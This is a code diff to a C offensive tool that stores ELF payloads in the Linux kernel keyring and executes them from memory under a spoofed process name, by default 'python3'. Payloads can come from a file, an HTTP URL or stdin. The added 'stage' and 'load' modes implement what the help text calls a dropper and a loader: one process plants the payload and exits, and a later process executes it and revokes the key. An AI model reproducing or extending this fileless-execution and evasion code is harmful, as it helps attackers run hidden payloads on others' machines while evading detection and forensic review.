@@ -595,9 +595,13 @@ static void usage(const char *me)
         "  %s bkfile  <elf> [spoof_name]            - keyring (big_key, 1MiB) + userland exec\n"
         "  %s bkhttp  <url> [spoof_name]            - keyring (big_key, 1MiB) + userland exec via HTTP\n"
         "  %s bkstdin [spoof_name]                  - keyring (big_key, 1MiB) + userland exec via stdin\n"
+        "  %s stage  <elf>                          - store ELF in session keyring, print key ID, exit\n"
+        "  %s load   <key_id> [spoof_name]          - read ELF from keyring by ID, exec, revoke\n"
         "\nspoof_name: argv[0] of loaded process (default: python3)\n"
-        "big_key requires CONFIG_BIG_KEYS=y (default on Ubuntu Server, RHEL 8/9)\n",
-        me, me, me, me, me, me, me, me, me);
+        "big_key requires CONFIG_BIG_KEYS=y (default on Ubuntu Server, RHEL 8/9)\n"
+        "stage+load demonstrate cross-process staging: dropper writes payload and exits,\n"
+        "loader reads from kernel slab later with no shared memory between them.\n",
+        me, me, me, me, me, me, me, me, me, me, me);
     exit(1);
 }
 
@@ -689,6 +693,33 @@ int main(int argc, char *argv[])
             char *ea[] = {spoof, NULL};
             uexec(&from_key, 1, ea, environ, spoof, argc, argv);
         }
+
+    } else if (strcmp(mode, "stage") == 0) {
+
+        if (argc < 3) usage(argv[0]);
+        rc = load_from_file(&payload, argv[2]);
+        if (rc == 0) {
+            long key_id = keyring_store(&payload);
+            free(payload.data); payload.data = NULL; payload.size = 0;
+            if (key_id < 0) return 1;
+            dprintf(1, "%ld\n", key_id);
+        }
+
+    } else if (strcmp(mode, "load") == 0) {
+
+        if (argc < 3) usage(argv[0]);
+        long key_id = atol(argv[2]);
+        if (key_id <= 0) {
+            dprintf(2, "[-] invalid key id: %s\n", argv[2]);
+            return 1;
+        }
+        char *spoof = strdup(argc > 3 ? argv[3] : "python3");
+
+        Buf from_key = {0};
+        if (keyring_load(key_id, &from_key) < 0) return 1;
+
+        char *ea[] = {spoof, NULL};
+        uexec(&from_key, 1, ea, environ, spoof, argc, argv);
 
     } else {
         usage(argv[0]);
